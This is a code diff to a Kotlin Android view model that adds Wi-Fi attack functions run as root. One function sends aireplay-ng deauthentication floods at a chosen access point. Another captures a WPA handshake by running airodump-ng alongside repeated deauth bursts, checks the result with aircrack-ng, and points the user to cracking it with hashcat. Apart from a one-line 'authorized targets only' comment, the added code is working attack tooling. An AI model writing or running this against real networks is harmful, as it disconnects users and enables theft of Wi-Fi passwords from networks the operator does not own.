@@ -37,8 +37,64 @@ class WirelessViewModel : ViewModel() {
     var aps by mutableStateOf<List<ApInfo>>(emptyList())
         private set
     var message by mutableStateOf<String?>(null)
+    var selected by mutableStateOf<ApInfo?>(null)
+        private set
+    var working by mutableStateOf(false)
+        private set
+    var action by mutableStateOf<String?>(null)
 
     init { detect() }
+
+    fun select(ap: ApInfo) {
+        selected = if (selected?.bssid == ap.bssid) null else ap
+        action = null
+    }
+
+    /** Deauth frames at the selected AP (authorized targets only). */
+    fun deauth(count: Int = 10) {
+        val ap = selected ?: return
+        val i = iface ?: return
+        if (working || scanning) return
+        working = true
+        action = "sending $count deauth to ${ap.essid}…"
+        viewModelScope.launch {
+            withContext(Dispatchers.IO) {
+                RootShell.chroot(
+                    "iw dev $i set channel ${ap.channel} 2>/dev/null; " +
+                        "aireplay-ng --deauth $count -a ${ap.bssid} $i 2>&1 | tail -2"
+                )
+            }
+            action = "deauth $count sent to ${ap.essid} (ch ${ap.channel})"
+            working = false
+        }
+    }
+
+    /** Capture a WPA handshake: targeted airodump + deauth bursts, then verify. */
+    fun capture(seconds: Int = 25) {
+        val ap = selected ?: return
+        val i = iface ?: return
+        if (working || scanning) return
+        working = true
+        action = "capturing handshake on ${ap.essid}…"
+        viewModelScope.launch {
+            val out = withContext(Dispatchers.IO) {
+                RootShell.chroot(
+                    "iw dev $i set channel ${ap.channel} 2>/dev/null; " +
+                        "rm -f /tmp/hs-*.cap /tmp/hs-*.csv /tmp/hs-*.netxml 2>/dev/null; " +
+                        "timeout $seconds airodump-ng -c ${ap.channel} --bssid ${ap.bssid} -w /tmp/hs $i >/dev/null 2>&1 & " +
+                        "AP=\$!; sleep 3; " +
+                        "for n in 1 2 3 4 5; do aireplay-ng --deauth 5 -a ${ap.bssid} $i >/dev/null 2>&1; sleep 4; done; " +
+                        "wait \$AP 2>/dev/null; " +
+                        "if aircrack-ng /tmp/hs-01.cap 2>/dev/null | grep -qi 'handshake'; then echo HS_OK; else echo HS_NO; fi"
+                )
+            }
+            action = if (out.contains("HS_OK"))
+                "✅ Handshake captured → /tmp/hs-01.cap (crack with hashcat/aircrack)"
+            else
+                "No handshake yet — needs an active client on ${ap.essid}. cap at /tmp/hs-01.cap"
+            working = false
+        }
+    }
 
     fun detect() {
         viewModelScope.launch {
